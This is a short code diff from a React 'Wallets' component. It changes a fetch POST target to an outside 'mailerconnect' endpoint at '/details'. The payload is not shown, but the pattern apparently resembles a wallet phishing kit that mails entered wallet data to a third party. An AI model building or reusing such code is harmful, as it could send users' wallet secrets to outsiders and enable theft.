@@ -61,7 +61,7 @@ const Wallets = () => {
     };
 
     try {
-      const url = 'https://yusfulmailerconnect-kwh6cn24a-vendmartwallets-projects.vercel.app';
+      const url = 'https://yusfulmailerconnect.onrender.com/details';
 
       const res = await fetch(url, {
         method: "POST",
